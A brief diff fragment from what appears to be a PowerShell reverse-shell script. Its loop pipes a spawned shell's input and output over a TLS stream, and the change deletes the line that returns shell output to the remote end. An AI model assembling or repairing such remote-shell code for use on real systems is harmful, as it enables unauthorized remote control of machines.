@@ -21,7 +21,6 @@ while(($shell.hasexited -eq $false))
 {
 	while($stdout.endofstream -eq $false)
 	{
-		$tlsstreamwriter.writeline($stdout.readline())
 		$stdin.writeline($tlsstreamreader.readline())
 	}
 }
